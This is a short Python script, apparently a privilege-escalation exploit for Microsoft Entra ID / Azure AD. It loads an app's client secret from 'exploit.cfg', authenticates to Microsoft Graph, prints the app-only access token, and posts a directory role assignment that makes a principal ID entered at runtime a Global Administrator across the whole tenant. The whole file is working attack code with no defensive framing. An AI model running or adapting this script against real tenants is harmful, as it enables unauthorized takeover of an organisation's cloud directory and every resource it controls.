import asyncio
import configparser
from configparser import SectionProxy
from azure.identity.aio import ClientSecretCredential
from msgraph import GraphServiceClient
from msgraph.generated.models.unified_role_assignment import UnifiedRoleAssignment
from msgraph.generated.models.o_data_errors.o_data_error import ODataError

class Graph:
    settings: SectionProxy
    client_credential: ClientSecretCredential
    app_client: GraphServiceClient

    def __init__(self, config: SectionProxy):
        self.settings = config
        client_id = self.settings['clientId']
        tenant_id = self.settings['tenantId']
        client_secret = self.settings['clientSecret']


        self.client_credential = ClientSecretCredential(tenant_id, client_id, client_secret)

        self.app_client = GraphServiceClient(self.client_credential) # type: ignore
    
    async def assign_ga(self, object_id):

        request_body = UnifiedRoleAssignment(
            odata_type = "#microsoft.graph.unifiedRoleAssignment",
            role_definition_id = "62e90394-69f5-4237-9190-012177145e10",
            principal_id = object_id,
            directory_scope_id = "/",
        )
        result = await self.app_client.role_management.directory.role_assignments.post(request_body)
        return result

    async def get_app_only_token(self):
        graph_scope = 'https://graph.microsoft.com/.default'
        access_token = await self.client_credential.get_token(graph_scope)
        return access_token.token

async def main():

    config = configparser.ConfigParser()
    config.read(['exploit.cfg'])
    azure_settings = config['azure']
    print('making graph client...')
    graph: Graph = Graph(azure_settings)

    print('Please input principalId to assign to Global Administrator:')
    object_id = str(input())

    try:
    
        await display_access_token(graph)
        print('')
        await assign_ga(graph, object_id)


        
    except ODataError as odata_error:
        print('Error:')
        if odata_error.error:
            print(odata_error.error.code, odata_error.error.message)

async def assign_ga(graph: Graph, object_id:str):
    resp = await graph.assign_ga(object_id)
    print('Response:', resp, '\n')

async def display_access_token(graph: Graph):
    token = await graph.get_app_only_token()
    print('App-only token:', token, '\n')



asyncio.run(main())